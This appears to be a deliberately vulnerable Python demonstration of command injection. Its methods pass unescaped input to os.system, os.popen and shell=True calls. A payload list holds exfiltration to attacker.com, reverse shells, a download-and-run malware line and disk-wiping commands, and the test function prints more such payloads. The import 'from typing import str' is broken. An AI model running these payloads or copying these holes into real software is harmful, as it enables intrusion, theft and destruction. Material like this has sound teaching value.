"""
CRITICAL RISK: Command Injection Vulnerabilities
WARNING: This demonstrates OS command execution exploits
Risk Score: 9.8/10 - CRITICAL
"""

import os
import subprocess
import platform
from typing import str


class CriticalCommandInjectionVulnerable:
    """Intentionally vulnerable class demonstrating command injection."""
    
    def execute_user_command(self, user_input: str) -> str:
        """
        CATASTROPHIC RISK: Direct execution of user input as system command
        Risk Score: 10/10 - Complete system compromise
        
        Args:
            user_input: Unsanitized user input
            
        Returns:
            Command output
        """
        # CRITICAL VULNERABILITY - Direct shell execution
        result = os.system(user_input)
        return f"Command executed with code: {result}"
    
    def process_file(self, filename: str) -> str:
        """
        CRITICAL RISK: Command injection via filename
        Risk Score: 9.9/10
        """
        # VULNERABLE - Filename not escaped
        command = f"cat {filename}"
        result = os.popen(command).read()
        return result
    
    def search_files(self, search_pattern: str) -> str:
        """
        CRITICAL RISK: Command injection in grep command
        Risk Score: 9.8/10
        """
        # VULNERABLE - Pattern not escaped
        command = f"grep -r '{search_pattern}' ."
        result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()
        return result.decode()
    
    def execute_script(self, script_name: str, args: str) -> str:
        """
        CRITICAL RISK: Arbitrary script execution
        Risk Score: 10/10
        """
        # VULNERABLE - Arguments concatenated directly
        command = f"python {script_name} {args}"
        os.system(command)
        return "Script executed"
    
    def ping_host(self, hostname: str) -> str:
        """
        CRITICAL RISK: Network command injection
        Risk Score: 9.7/10
        """
        # VULNERABLE - Hostname not validated
        if platform.system() == "Windows":
            command = f"ping -c 4 {hostname}"
        else:
            command = f"ping -c 4 {hostname}"
        
        result = os.popen(command).read()
        return result
    
    def database_backup(self, db_name: str, output_file: str) -> str:
        """
        CRITICAL RISK: Database backup with injection
        Risk Score: 9.9/10
        """
        # VULNERABLE - Parameters not escaped
        command = f"mysqldump {db_name} > {output_file}"
        os.system(command)
        return "Backup created"


# Attack payloads demonstrating command injection
DANGEROUS_PAYLOADS = [
    # Command chaining
    "ls; rm -rf /",
    "cat /etc/passwd | nc attacker.com 1234",
    
    # Data exfiltration
    "$(curl http://attacker.com/exfil?data=$(cat /etc/shadow))",
    "; curl http://attacker.com/steal?data=$(hostname)",
    
    # Reverse shell
    "| bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
    
    # Privilege escalation
    "; sudo -l",
    "| sudo bash",
    
    # Ransomware deployment
    "; wget http://attacker.com/malware.sh -O /tmp/m.sh; chmod +x /tmp/m.sh; /tmp/m.sh",
    
    # System destruction
    "& format C: /Y",
    "; dd if=/dev/zero of=/dev/sda",
]


def test_command_injection_risks():
    """Test command injection vulnerabilities."""
    vulnerable = CriticalCommandInjectionVulnerable()
    
    print("[CRITICAL VULNERABILITY] Command Injection Testing")
    print("=" * 70)
    
    # Demonstrate path traversal + command injection
    print("\n[ATTACK SCENARIO 1] Data Exfiltration")
    print("Attack: Steal sensitive files via command injection")
    malicious_input = "; cat /etc/passwd | base64 | curl -d @- http://attacker.com"
    print(f"Payload: {malicious_input}")
    print("Result: Sensitive system files stolen")
    
    # Demonstrate privilege escalation
    print("\n[ATTACK SCENARIO 2] Privilege Escalation")
    print("Attack: Execute commands as root")
    malicious_input = "; sudo bash -i"
    print(f"Payload: {malicious_input}")
    print("Result: Root shell obtained")
    
    # Demonstrate malware deployment
    print("\n[ATTACK SCENARIO 3] Malware Deployment")
    print("Attack: Download and execute malware")
    malicious_input = "; wget http://attacker.com/virus.sh | bash"
    print(f"Payload: {malicious_input}")
    print("Result: System compromised with malware")
    
    print("\n[RISK ASSESSMENT]")
    print("- Remote Code Execution: CRITICAL")
    print("- Data Exfiltration: CRITICAL")
    print("- Privilege Escalation: CRITICAL")
    print("- System Destruction: CRITICAL")
    print("- Malware Installation: CRITICAL")
    print("\nRisk Score: 9.8/10 - CRITICAL VULNERABILITY")
    print("Impact: Complete system compromise")


if __name__ == '__main__':
    test_command_injection_risks()
